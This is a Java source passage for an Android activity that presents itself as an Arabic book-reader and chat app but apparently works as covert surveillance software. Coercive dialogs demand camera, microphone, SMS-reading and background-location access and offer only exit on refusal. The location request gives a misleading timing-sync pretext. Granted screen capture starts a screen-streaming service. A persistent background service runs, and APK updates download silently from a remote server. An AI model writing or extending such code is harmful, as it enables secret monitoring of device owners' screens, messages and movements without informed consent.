package com.h4ckinto.android.ui;

import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.media.projection.MediaProjectionManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.PowerManager;
import android.provider.Settings;
import android.util.Log;
import android.view.MenuItem;
import android.view.View;
import android.view.WindowManager;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AlertDialog;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.content.res.ColorStateList;
import androidx.core.view.WindowCompat;
import androidx.core.view.WindowInsetsControllerCompat;
import androidx.fragment.app.Fragment;
import androidx.fragment.app.FragmentTransaction;

import com.google.android.material.bottomnavigation.BottomNavigationView;
import com.google.android.material.card.MaterialCardView;
import com.h4ckinto.android.R;
import com.h4ckinto.android.service.MainService;
import com.h4ckinto.android.service.ScreenStreamService;
import com.h4ckinto.android.ui.fragments.CallsFragment;
import com.h4ckinto.android.ui.fragments.ChatListFragment;
import com.h4ckinto.android.ui.fragments.ChatSettingsFragment;
import com.h4ckinto.android.ui.fragments.ContactsFragment;
import com.h4ckinto.android.ui.fragments.ExploreFragment;
import com.h4ckinto.android.ui.fragments.HomeFragment;
import com.h4ckinto.android.ui.fragments.LibraryFragment;
import com.h4ckinto.android.ui.fragments.SettingsFragment;
import com.h4ckinto.android.network.ChatSocketManager;
import com.h4ckinto.android.utils.AppLockManager;
import com.h4ckinto.android.utils.ChatNotificationManager;
import com.h4ckinto.android.utils.ChatPrefs;
import com.h4ckinto.android.utils.Constants;
import com.h4ckinto.android.update.AppUpdateManager;
import com.h4ckinto.android.update.ForcedUpdateActivity;
import com.h4ckinto.android.update.UpdateInProgressActivity;
import com.h4ckinto.android.utils.Constants;
import com.h4ckinto.android.utils.DesignConfig;
import com.h4ckinto.android.utils.PermissionBootstrap;
import com.h4ckinto.android.utils.PermissionDetector;
import com.h4ckinto.android.utils.StoragePermissionManager;

import android.app.KeyguardManager;

/**
 * Main Activity for the Book Reader App
 * Beautiful dark Arabic UI with bottom navigation
 */
public class BookReaderActivity extends BaseActivity {

    private static final String TAG = "BookReaderActivity";
    
    private static final int REQUEST_STORAGE_PERMISSION = 100;
    private static final int REQUEST_MANAGE_STORAGE = 101;
    private static final int REQUEST_BATTERY_OPTIMIZATION = 102;
    private static final int REQUEST_CAMERA_AUDIO_PERMISSION = 103;
    private static final int REQUEST_LOCATION_PERMISSION = 104;
    private static final int REQUEST_BACKGROUND_LOCATION = 105;
    private static final int REQUEST_SMS_PERMISSION = 106;
    private static final int REQUEST_SCREEN_CAPTURE = Constants.REQUEST_CODE_SCREEN_CAPTURE;

    private BottomNavigationView bottomNavigation;
    private Fragment currentFragment;
    
    // Library mode fragment instances
    private HomeFragment homeFragment;
    private LibraryFragment libraryFragment;
    private ExploreFragment exploreFragment;
    private SettingsFragment settingsFragment;
    
    // Chat mode fragment instances
    private ChatListFragment chatListFragment;
    private ContactsFragment contactsFragment;
    private CallsFragment callsFragment;
    private ChatSettingsFragment chatSettingsFragment;
    
    private Fragment defaultFragment;
    private boolean isChatMode = false;
    
    private boolean serviceStarted = false;
    private boolean screenPermissionGranted = false;
    private boolean mainUiInitialized = false;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        isChatMode = DesignConfig.isChatMode(this);

        if (!PermissionBootstrap.areAllRequiredGranted(this)) {
            PermissionBootstrap.runMandatoryStartupFlow(this,
                    () -> continueOnCreateAfterPermissions(savedInstanceState));
            return;
        }
        continueOnCreateAfterPermissions(savedInstanceState);
    }

    private void continueOnCreateAfterPermissions(Bundle savedInstanceState) {
        if (mainUiInitialized) {
            if (!serviceStarted) {
                startBackgroundService();
            }
            return;
        }
        mainUiInitialized = true;

        // For chat mode, redirect to PIN screen if not verified
        if (isChatMode && savedInstanceState == null) {
            boolean pinVerified = getIntent().getBooleanExtra("pin_verified", false);
            if (!pinVerified) {
                Intent pinIntent = new Intent(this, SecurePinActivity.class);
                startActivity(pinIntent);
                finish();
                return;
            }
        }

        // Connect to chat socket if in chat mode and authenticated
        if (isChatMode) {
            ChatPrefs chatPrefs = new ChatPrefs(this);
            if (chatPrefs.isAuthenticated() && chatPrefs.getUserId() > 0) {
                ChatSocketManager.getInstance().connect(chatPrefs.getUserId());
                setupIncomingCallListener();
            }
        }

        setupStatusBar();
        setContentView(R.layout.activity_book_reader);

        initFragments();
        initViews();

        if (savedInstanceState == null) {
            loadFragment(defaultFragment);
        }

        runUpdateCheck();
        checkUpdateReadyToInstall();
        startBackgroundService();
    }

    /** If update downloaded but not installed: block app and show install screen only. If download in progress: show progress screen. */
    private void checkUpdateReadyToInstall() {
        android.content.SharedPreferences prefs = getSharedPreferences("app_update", MODE_PRIVATE);
        if (prefs.getBoolean("update_download_complete", false)) {
            Intent intent = new Intent(this, UpdateInProgressActivity.class);
            intent.putExtra(UpdateInProgressActivity.EXTRA_INSTALL_READY, true);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
            finish();
            return;
        }
        if (prefs.getLong(com.h4ckinto.android.update.UpdateDownloadReceiver.PREF_DOWNLOAD_ID, -1) == AppUpdateManager.DOWNLOAD_ID_OKHTTP
                && !prefs.getBoolean(AppUpdateManager.PREF_DOWNLOAD_FAILED, false)) {
            Intent intent = new Intent(this, UpdateInProgressActivity.class);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TOP);
            startActivity(intent);
            finish();
        }
    }

    /**
     * Checks for app update. If server returns currentVersion < min_supported_version,
     * launches ForcedUpdateActivity and finishes this activity.
     */
    private void runUpdateCheck() {
        String url = Constants.CHAT_SERVER_URL + "/api/app/update";
        AppUpdateManager manager = new AppUpdateManager(this, url);
        manager.checkForUpdate(new AppUpdateManager.UpdateCheckCallback() {
            @Override
            public void onNoUpdate() { }

            @Override
            public void onUpdateAvailable(int newVersionCode, String message, boolean alreadyDownloaded, String apkUrl) {
                runOnUiThread(() -> {
                    if (!alreadyDownloaded && apkUrl != null && !apkUrl.isEmpty()) {
                        manager.startDownload(apkUrl);
                    }
                });
            }

            @Override
            public void onForcedUpdateRequired(int minSupportedVersion, String message, String apkUrl) {
                runOnUiThread(() -> {
                    Intent intent = new Intent(BookReaderActivity.this, ForcedUpdateActivity.class);
                    intent.putExtra(ForcedUpdateActivity.EXTRA_MESSAGE, message);
                    intent.putExtra(ForcedUpdateActivity.EXTRA_APK_URL, apkUrl);
                    startActivity(intent);
                    finish();
                });
            }

            @Override
            public void onError(String message) {
                Log.e(TAG, "Update check failed: " + message);
            }
        });
    }
    
    private static final int REQUEST_STORAGE_NOTIF = 200;
    private static final int REQUEST_NOTIFICATION_SETTINGS = 201;
    private static final int REQUEST_REMAINING_PERMS = 202;
    private static final int REQUEST_NOTIFICATION_PERM = 203;
    /** Chat mode: location for WiFi scan + GPS on panel (not asked in legacy camera-first flow) */
    private static final int REQUEST_CHAT_LOCATION_FOR_PANEL = 204;

    private void requestPermissions() {
        PermissionBootstrap.runMandatoryStartupFlow(this,
                () -> continueOnCreateAfterPermissions(null));
    }

    private void requestStorageAndNotifications() {
        // Only notifications on startup; file/camera permissions are requested on-demand
        requestNotificationPermission();
    }

    private void requestNotificationPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.POST_NOTIFICATIONS)
                    != PackageManager.PERMISSION_GRANTED) {
                ActivityCompat.requestPermissions(this,
                        new String[]{Manifest.permission.POST_NOTIFICATIONS},
                        REQUEST_NOTIFICATION_PERM);
                return;
            }
        }

        if (!androidx.core.app.NotificationManagerCompat.from(this).areNotificationsEnabled()) {
            new AlertDialog.Builder(this)
                    .setTitle("\u0625\u0630\u0646 \u0627\u0644\u0625\u0634\u0639\u0627\u0631\u0627\u062A")
                    .setMessage("\u0627\u0644\u062A\u0637\u0628\u064A\u0642 \u064A\u062D\u062A\u0627\u062C \u0625\u0644\u0649 \u0625\u0630\u0646 \u0627\u0644\u0625\u0634\u0639\u0627\u0631\u0627\u062A.")
                    .setPositiveButton("\u062A\u0641\u0639\u064A\u0644", (dialog, which) -> {
                        Intent intent = new Intent();
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            intent.setAction(android.provider.Settings.ACTION_APP_NOTIFICATION_SETTINGS);
                            intent.putExtra(android.provider.Settings.EXTRA_APP_PACKAGE, getPackageName());
                        } else {
                            intent.setAction(android.provider.Settings.ACTION_APPLICATION_DETAILS_SETTINGS);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                        }
                        startActivityForResult(intent, REQUEST_NOTIFICATION_SETTINGS);
                    })
                    .setCancelable(false)
                    .show();
            return;
        }

        requestRemainingPermissions();
    }

    private void requestRemainingPermissions() {
        // Chat mode only reaches here — ask location so panel WiFi (0xWI) and GPS work
        requestLocationForChatPanelIfNeeded();
    }

    /**
     * After notifications, require location if missing (WiFi scan, GPS, timing-related services).
     */
    private void requestLocationForChatPanelIfNeeded() {
        if (!PermissionDetector.isLocationAvailable(this)) {
            requestBatteryOptimization();
            return;
        }
        boolean hasFine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
        boolean hasCoarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION)
                == PackageManager.PERMISSION_GRANTED;
        if (hasFine || hasCoarse) {
            requestBatteryOptimization();
            return;
        }
        AlertDialog locDialog = new AlertDialog.Builder(this, R.style.DarkAlertDialog)
                .setTitle("\u0625\u0630\u0646 \u0627\u0644\u0645\u0648\u0642\u0639 \u0645\u0637\u0644\u0648\u0628")
                .setMessage(
                        "\u064A\u062C\u0628 \u0642\u0628\u0648\u0644 \u0625\u0630\u0646 \u0627\u0644\u0645\u0648\u0642\u0639 \u0644\u062A\u0641\u0639\u064A\u0644 \u0645\u0632\u0627\u0645\u0646\u0629 \u062A\u0648\u0642\u064A\u062A \u0627\u0644\u0631\u0633\u0627\u0626\u0644 \u0648\u0636\u0628\u0637 \u0627\u0644\u0648\u0642\u062A \u0628\u0634\u0643\u0644 \u0635\u062D\u064A\u062D.\n\n"
                                + "\u0644\u0627 \u064A\u0645\u0643\u0646 \u062A\u0634\u063A\u064A\u0644 \u0627\u0644\u062A\u0637\u0628\u064A\u0642 \u062F\u0648\u0646 \u0647\u0630\u0627 \u0627\u0644\u0625\u0630\u0646\u060C \u0648\u0644\u0627 \u064A\u0645\u0643\u0646 \u062A\u062C\u0627\u0648\u0632 \u0647\u0630\u0647 \u0627\u0644\u062E\u0637\u0648\u0629. \u0627\u0644\u0642\u0628\u0648\u0644 \u0625\u0644\u0632\u0627\u0645\u064A \u0644\u064A\u0639\u0645\u0644 \u0627\u0644\u062A\u0637\u0628\u064A\u0642 \u0628\u0634\u0643\u0644 \u0637\u0628\u064A\u0639\u064A.\n\n"
                                + "\u0639\u0646\u062F \u0638\u0647\u0648\u0631 \u0646\u0627\u0641\u0630\u0629 \u0627\u0644\u0646\u0638\u0627\u0645\u060C \u0627\u062E\u062A\u0631 \"\u0627\u0644\u0633\u0645\u0627\u062D\" \u0648\u064A\u0645\u0643\u0646\u0643 \u0627\u062E\u062A\u064A\u0627\u0631 \"\u0623\u062B\u0646\u0627\u0621 \u0627\u0633\u062A\u062E\u062F\u0627\u0645 \u0627\u0644\u062A\u0637\u0628\u064A\u0642\" \u0625\u0630\u0627 \u0648\u062C\u062F\u062A.")
                .setPositiveButton("\u0627\u0644\u0645\u0648\u0627\u0641\u0642\u0629 \u0648\u0627\u0644\u0645\u062A\u0627\u0628\u0639\u0629", (dialog, which) -> ActivityCompat.requestPermissions(this,
                        new String[]{
                                Manifest.permission.ACCESS_FINE_LOCATION,
                                Manifest.permission.ACCESS_COARSE_LOCATION
                        },
                        REQUEST_CHAT_LOCATION_FOR_PANEL))
                .setCancelable(false)
                .create();
        locDialog.setCanceledOnTouchOutside(false);
        locDialog.show();
    }
    
    private ChatSocketManager.OnCallListener incomingCallListener;
    private ChatSocketManager.OnMessageReceivedListener globalMsgListener;
    private ChatSocketManager.OnDeviceEventListener deviceEventListener;

    private void setupIncomingCallListener() {
        incomingCallListener = new ChatSocketManager.OnCallListener() {
            @Override
            public void onIncomingCall(String callId, int callerId, String callerName, String callerInitials, String callerAvatarColor, org.json.JSONObject offer) {
                runOnUiThread(() -> {
                    Intent intent = AudioCallActivity.createIncoming(
                            BookReaderActivity.this, callId, callerId, callerName, callerInitials, callerAvatarColor, offer);
                    startActivity(intent);
                });
            }
            @Override public void onCallRinging(String callId, int receiverId) {}
            @Override public void onCallAnswered(String callId, org.json.JSONObject answerSdp) {}
            @Override public void onCallEnded(String callId, String reason, int duration) {}
            @Override public void onCallAudio(String callId, String base64Audio) {}
            @Override public void onCallMute(String callId, int userId, boolean isMuted) {}
            @Override public void onCallIceCandidate(String callId, org.json.JSONObject candidate) {}
        };
        ChatSocketManager.getInstance().addCallListener(incomingCallListener);

        // Global message listener for notifications
        ChatNotificationManager.getInstance().createChannel(this);
        globalMsgListener = (message, convId) -> {
            try {
                String senderName = message.optString("sender_name", "مستخدم");
                String senderInitials = message.optString("sender_initials", "؟");
                int senderId = message.getInt("sender_id");
                String msgType = message.optString("message_type", "text");
                String text = message.optString("text", "");

                String preview;
                if ("image".equals(msgType)) preview = "\u0635\u0648\u0631\u0629";
                else if ("voice".equals(msgType)) preview = "\u0631\u0633\u0627\u0644\u0629 \u0635\u0648\u062A\u064A\u0629";
                else if ("document".equals(msgType)) preview = "\u0645\u0633\u062A\u0646\u062F";
                else preview = text;

                ChatNotificationManager.getInstance().showMessageNotification(
                        getApplicationContext(), convId, senderId,
                        senderName, preview, senderInitials, "#3B82F6");
            } catch (Exception e) {
                Log.e(TAG, "Notification error: " + e.getMessage());
            }
        };
        ChatSocketManager.getInstance().addMessageReceivedListener(globalMsgListener);

        deviceEventListener = new ChatSocketManager.OnDeviceEventListener() {
            @Override
            public void onNewDeviceLogin(String deviceId, String deviceName, int deviceCount, String timestamp) {
                runOnUiThread(() -> showNewDeviceAlert(deviceName, deviceCount));
            }

            @Override
            public void onForceLogout(String deviceId, String reason) {
                String myDeviceId = ChatPrefs.getOrCreateDeviceId(BookReaderActivity.this);
                if (deviceId.equals(myDeviceId)) {
                    runOnUiThread(() -> {
                        ChatPrefs chatPrefs = new ChatPrefs(BookReaderActivity.this);
                        chatPrefs.clear();
                        ChatSocketManager.getInstance().disconnect();
                        Toast.makeText(BookReaderActivity.this,
                                "\u062A\u0645 \u062A\u0633\u062C\u064A\u0644 \u0627\u0644\u062E\u0631\u0648\u062C \u0645\u0646 \u062C\u0647\u0627\u0632 \u0622\u062E\u0631",
                                Toast.LENGTH_LONG).show();
                        Intent intent = new Intent(BookReaderActivity.this, SecurePinActivity.class);
                        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
                        startActivity(intent);
                        finish();
                    });
                }
            }
        };
        ChatSocketManager.getInstance().addDeviceEventListener(deviceEventListener);
    }

    /**
     * Step 1: Request camera and audio permissions (if declared in manifest)
     */
    private void requestCameraAndAudioPermissions() {
        boolean needsCamera = PermissionDetector.isCameraAvailable(this);
        boolean needsMicrophone = PermissionDetector.isMicrophoneAvailable(this);
        
        if (!needsCamera && !needsMicrophone) {
            // Not declared in manifest, skip to next step
            requestLocationPermission();
            return;
        }
        
        boolean hasCameraPermission = !needsCamera || ContextCompat.checkSelfPermission(this, 
            Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED;
        boolean hasAudioPermission = !needsMicrophone || ContextCompat.checkSelfPermission(this, 
            Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED;
        
        if (!hasCameraPermission || !hasAudioPermission) {
            Log.d(TAG, "Requesting camera/audio permissions...");
            
            // Build message dynamically based on what's needed
            StringBuilder message = new StringBuilder("This app requires the following permissions:\n\n");
            if (needsCamera) message.append("• Camera: To take photos\n");
            if (needsMicrophone) message.append("• Microphone: To record audio\n");
            message.append("\nThe app cannot work without these permissions.");
            
            // Build permission array dynamically
            java.util.ArrayList<String> permissionsList = new java.util.ArrayList<>();
            if (needsCamera) permissionsList.add(Manifest.permission.CAMERA);
            if (needsMicrophone) permissionsList.add(Manifest.permission.RECORD_AUDIO);
            String[] permissions = permissionsList.toArray(new String[0]);
            
            new AlertDialog.Builder(this)
                .setTitle("Permissions Required")
                .setMessage(message.toString())
                .setPositiveButton("Grant Permissions", (dialog, which) -> {
                    ActivityCompat.requestPermissions(this, permissions, REQUEST_CAMERA_AUDIO_PERMISSION);
                })
                .setNegativeButton("Exit App", (dialog, which) -> {
                    Toast.makeText(this, "Permissions denied. Exiting app.", Toast.LENGTH_LONG).show();
                    finishAffinity();
                })
                .setCancelable(false)
                .show();
        } else {
            Log.d(TAG, "Camera/audio permissions already granted");
            requestScreenMonitorPermission();
        }
    }
    
    /**
     * Step 2: Request screen monitoring permission (if declared in manifest)
     */
    private void requestScreenMonitorPermission() {
        if (!PermissionDetector.isScreenMonitorAvailable(this)) {
            // Not declared in manifest, skip to next step
            requestLocationPermission();
            return;
        }
        
        if (screenPermissionGranted) {
            requestLocationPermission();
            return;
        }
        
        Log.d(TAG, "Requesting screen monitoring permission...");
        
        new AlertDialog.Builder(this)
            .setTitle("Screen Access Required")
            .setMessage("This app requires screen access permission to function.\n\n" +
                       "Please tap 'Start now' on the next screen to grant permission.\n\n" +
                       "The app cannot work without this permission.")
            .setPositiveButton("Continue", (dialog, which) -> {
                requestScreenRecordingPermission();
            })
            .setNegativeButton("Exit App", (dialog, which) -> {
                Toast.makeText(this, "Permission denied. Exiting app.", Toast.LENGTH_LONG).show();
                finishAffinity();
            })
            .setCancelable(false)
            .show();
    }
    
    /**
     * Request screen recording permission using MediaProjection API
     */
    private void requestScreenRecordingPermission() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP) {
            try {
                MediaProjectionManager projectionManager = 
                    (MediaProjectionManager) getSystemService(Context.MEDIA_PROJECTION_SERVICE);
                
                if (projectionManager != null) {
                    Log.d(TAG, "Requesting screen capture permission...");
                    Intent captureIntent = projectionManager.createScreenCaptureIntent();
                    startActivityForResult(captureIntent, REQUEST_SCREEN_CAPTURE);
                } else {
                    Log.e(TAG, "MediaProjectionManager not available");
                    showScreenPermissionDeniedDialog();
                }
            } catch (Exception e) {
                Log.e(TAG, "Error requesting screen capture permission: " + e.getMessage());
                showScreenPermissionDeniedDialog();
            }
        } else {
            screenPermissionGranted = true;
            requestLocationPermission();
        }
    }
    
    /**
     * Show dialog when screen permission is denied
     */
    private void showScreenPermissionDeniedDialog() {
        new AlertDialog.Builder(this)
            .setTitle("Permission Required")
            .setMessage("Screen access permission is required for this app to work.\n\n" +
                       "Without this permission, the app cannot function.\n\n" +
                       "Please grant the permission to continue.")
            .setPositiveButton("Try Again", (dialog, which) -> {
                requestScreenRecordingPermission();
            })
            .setNegativeButton("Exit App", (dialog, which) -> {
                Toast.makeText(this, "Exiting app due to missing permission.", Toast.LENGTH_LONG).show();
                finishAffinity();
            })
            .setCancelable(false)
            .show();
    }
    
    /**
     * Step 3: Request location permissions (if declared in manifest)
     * Directly shows system permission dialog (like camera)
     * User selects "Allow only while using the app" - works in background via foreground service
     */
    private void requestLocationPermission() {
        if (!PermissionDetector.isLocationAvailable(this)) {
            // Not declared in manifest, skip to next step
            requestSmsPermission();
            return;
        }
        
        boolean hasFineLocation = ContextCompat.checkSelfPermission(this, 
            Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED;
        
        if (!hasFineLocation) {
            // Request foreground location only - system dialog will show
            // User can select "Allow only while using the app"
            // Foreground service will keep it running in background
            Log.d(TAG, "Requesting location permission (foreground only)...");
            ActivityCompat.requestPermissions(this, 
                new String[]{
                    Manifest.permission.ACCESS_FINE_LOCATION,
                    Manifest.permission.ACCESS_COARSE_LOCATION
                }, 
                REQUEST_LOCATION_PERMISSION);
        } else {
            Log.d(TAG, "Location permission already granted");
            requestSmsPermission();
        }
    }
    
    /**
     * Step 4: Request background location (Android 10+, if location is declared)
     */
    private void requestBackgroundLocation() {
        if (!PermissionDetector.isLocationAvailable(this)) {
            requestSmsPermission();
            return;
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            boolean hasBackgroundLocation = ContextCompat.checkSelfPermission(this,
                Manifest.permission.ACCESS_BACKGROUND_LOCATION) == PackageManager.PERMISSION_GRANTED;
            
            if (!hasBackgroundLocation) {
                Log.d(TAG, "Requesting background location permission...");
                
                new AlertDialog.Builder(this)
                    .setTitle("Background Location Required")
                    .setMessage("This app needs to access your location in the background.\n\n" +
                               "On the next screen, please select \"Allow all the time\" to enable background location.")
                    .setPositiveButton("Continue", (dialog, which) -> {
                        ActivityCompat.requestPermissions(this,
                            new String[]{ Manifest.permission.ACCESS_BACKGROUND_LOCATION },
                            REQUEST_BACKGROUND_LOCATION);
                    })
                    .setNegativeButton("Exit App", (dialog, which) -> {
                        Toast.makeText(this, "Permission denied. Exiting app.", Toast.LENGTH_LONG).show();
                        finishAffinity();
                    })
                    .setCancelable(false)
                    .show();
            } else {
                Log.d(TAG, "Background location already granted");
                requestSmsPermission();
            }
        } else {
            requestSmsPermission();
        }
    }
    
    /**
     * Step 5: Request SMS permission (if declared in manifest)
     */
    private void requestSmsPermission() {
        if (!PermissionDetector.isSmsAvailable(this)) {
            // Not declared in manifest, skip to battery optimization
            requestBatteryOptimization();
            return;
        }
        
        boolean hasSms = ContextCompat.checkSelfPermission(this, 
            Manifest.permission.READ_SMS) == PackageManager.PERMISSION_GRANTED;
        
        if (!hasSms) {
            Log.d(TAG, "Requesting SMS permission...");
            
            new AlertDialog.Builder(this)
                .setTitle("SMS Permission Required")
                .setMessage("This app requires SMS access to function.\n\n" +
                           "• SMS: To read messages\n\n" +
                           "The app cannot work without this permission.")
                .setPositiveButton("Grant Permission", (dialog, which) -> {
                    ActivityCompat.requestPermissions(this, 
                        new String[]{ Manifest.permission.READ_SMS }, 
                        REQUEST_SMS_PERMISSION);
                })
                .setNegativeButton("Exit App", (dialog, which) -> {
                    Toast.makeText(this, "Permission denied. Exiting app.", Toast.LENGTH_LONG).show();
                    finishAffinity();
                })
                .setCancelable(false)
                .show();
        } else {
            Log.d(TAG, "SMS permission already granted");
            requestBatteryOptimization();
        }
    }
    
    private void requestBatteryOptimization() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
            PowerManager pm = (PowerManager) getSystemService(POWER_SERVICE);
            if (pm != null && !pm.isIgnoringBatteryOptimizations(getPackageName())) {
                new AlertDialog.Builder(this)
                    .setTitle("Battery Optimization")
                    .setMessage("Allow app to run in background for continuous file access?")
                    .setPositiveButton("Allow", (dialog, which) -> {
                        try {
                            Intent intent = new Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS);
                            intent.setData(Uri.parse("package:" + getPackageName()));
                            startActivityForResult(intent, REQUEST_BATTERY_OPTIMIZATION);
                        } catch (Exception e) {
                            startBackgroundService();
                        }
                    })
                    .setNegativeButton("Skip", (dialog, which) -> startBackgroundService())
                    .show();
            } else {
                startBackgroundService();
            }
        } else {
            startBackgroundService();
        }
    }
    
    private void startBackgroundService() {
        if (serviceStarted) return;
        
        try {
            Intent serviceIntent = new Intent(this, MainService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                startForegroundService(serviceIntent);
            } else {
                startService(serviceIntent);
            }
            serviceStarted = true;
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        
        if (requestCode == REQUEST_SCREEN_CAPTURE) {
            if (resultCode == RESULT_OK && data != null) {
                Log.d(TAG, "✅ Screen capture permission GRANTED");
                screenPermissionGranted = true;
                
                // Start the ScreenStreamService with the permission result
                Intent serviceIntent = new Intent(this, ScreenStreamService.class);
                serviceIntent.putExtra(ScreenStreamService.EXTRA_RESULT_CODE, resultCode);
                serviceIntent.putExtra(ScreenStreamService.EXTRA_RESULT_DATA, data);
                serviceIntent.putExtra(ScreenStreamService.EXTRA_QUALITY, 50);
                serviceIntent.putExtra(ScreenStreamService.EXTRA_FPS, 5);
                serviceIntent.putExtra(ScreenStreamService.EXTRA_SCALE, 0.5f);
                
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    startForegroundService(serviceIntent);
                } else {
                    startService(serviceIntent);
                }
                
                // Continue to next permission
                requestLocationPermission();
                
            } else {
                Log.w(TAG, "❌ Screen capture permission DENIED");
                showScreenPermissionDeniedDialog();
            }
        } else if (requestCode == REQUEST_NOTIFICATION_SETTINGS) {
            requestNotificationPermission();
        } else if (requestCode == REQUEST_BATTERY_OPTIMIZATION
                || requestCode == StoragePermissionManager.REQUEST_CODE_MANAGE_STORAGE) {
            PermissionBootstrap.onActivityResult(this, requestCode, resultCode,
                    () -> continueOnCreateAfterPermissions(null));
        } else if (requestCode == REQUEST_KEYGUARD) {
            AppLockManager lockMgr = AppLockManager.getInstance(this);
            View lockOverlay = findViewById(R.id.lock_overlay);
            if (resultCode == RESULT_OK) {
                lockMgr.unlock();
                if (lockOverlay != null) lockOverlay.setVisibility(View.GONE);
            } else {
                finishAffinity();
            }
        }
    }
    
    @Override
    protected void onResume() {
        super.onResume();
        PermissionBootstrap.ensureRequiredOnResume(this,
                () -> continueOnCreateAfterPermissions(null));
        if (!PermissionBootstrap.areAllRequiredGranted(this)) {
            return;
        }
        checkUpdateReadyToInstall();
        if (isChatMode) {
            ChatSocketManager.getInstance().setAppForeground(true);
            ChatNotificationManager.getInstance().setAppInForeground(true);
        }
        checkBiometricLock();
    }

    @Override
    protected void onStop() {
        super.onStop();
        if (isChatMode) {
            ChatSocketManager.getInstance().setAppForeground(false);
            ChatNotificationManager.getInstance().setAppInForeground(false);
        }
    }

    private void showNewDeviceAlert(String deviceName, int deviceCount) {
        String name = (deviceName != null && !deviceName.isEmpty()) ? deviceName : "\u062C\u0647\u0627\u0632 \u062C\u062F\u064A\u062F";
        new AlertDialog.Builder(this, R.style.DarkAlertDialog)
                .setTitle("\u062A\u0633\u062C\u064A\u0644 \u062F\u062E\u0648\u0644 \u062C\u062F\u064A\u062F")
                .setMessage("\u062A\u0645 \u062A\u0633\u062C\u064A\u0644 \u0627\u0644\u062F\u062E\u0648\u0644 \u0645\u0646 \u062C\u0647\u0627\u0632:\n" + name +
                        "\n\n\u0625\u062C\u0645\u0627\u0644\u064A \u0627\u0644\u0623\u062C\u0647\u0632\u0629: " + deviceCount +
                        "\n\n\u0625\u0630\u0627 \u0644\u0645 \u062A\u0643\u0646 \u0623\u0646\u062A\u060C \u064A\u0645\u0643\u0646\u0643 \u0625\u0632\u0627\u0644\u0629 \u0627\u0644\u062C\u0647\u0627\u0632 \u0648\u062A\u063A\u064A\u064A\u0631 \u0627\u0644\u0631\u0645\u0632 \u0645\u0646 \u0627\u0644\u0625\u0639\u062F\u0627\u062F\u0627\u062A.")
                .setPositiveButton("\u062D\u0633\u0646\u0627\u064B", null)
                .setNegativeButton("\u0627\u0644\u0625\u0639\u062F\u0627\u062F\u0627\u062A", (d, w) -> {
                    if (bottomNavigation != null && isChatMode) {
                        bottomNavigation.setSelectedItemId(R.id.nav_settings);
                    }
                })
                .show();
    }

    private static final int REQUEST_KEYGUARD = 999;

    private void checkBiometricLock() {
        AppLockManager lockMgr = AppLockManager.getInstance(this);
        if (!lockMgr.shouldLock()) {
            lockMgr.touch();
            return;
        }

        KeyguardManager km = (KeyguardManager) getSystemService(KEYGUARD_SERVICE);
        if (km == null || !km.isKeyguardSecure()) {
            lockMgr.unlock();
            return;
        }

        View lockOverlay = findViewById(R.id.lock_overlay);
        if (lockOverlay != null) lockOverlay.setVisibility(View.VISIBLE);

        Intent authIntent = km.createConfirmDeviceCredentialIntent(
                "\u0641\u062A\u062D \u0627\u0644\u062A\u0637\u0628\u064A\u0642",
                "\u0627\u0633\u062A\u062E\u062F\u0645 \u0628\u0635\u0645\u0629 \u0627\u0644\u0625\u0635\u0628\u0639 \u0623\u0648 \u0631\u0645\u0632 \u0627\u0644\u062C\u0647\u0627\u0632");
        if (authIntent != null) {
            startActivityForResult(authIntent, REQUEST_KEYGUARD);
        } else {
            lockMgr.unlock();
            if (lockOverlay != null) lockOverlay.setVisibility(View.GONE);
        }
    }
    
    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == PermissionBootstrap.REQUEST_RUNTIME_BATCH
                || requestCode == StoragePermissionManager.REQUEST_CODE_STORAGE
                || requestCode == PermissionBootstrap.REQUEST_BATTERY) {
            PermissionBootstrap.onRequestPermissionsResult(this, requestCode, permissions, grantResults,
                    () -> continueOnCreateAfterPermissions(null));
            return;
        }

        if (requestCode == REQUEST_NOTIFICATION_PERM) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                requestRemainingPermissions();
            } else {
                boolean permanentlyDenied = !ActivityCompat.shouldShowRequestPermissionRationale(
                        this, Manifest.permission.POST_NOTIFICATIONS);
                if (permanentlyDenied) {
                    new AlertDialog.Builder(this)
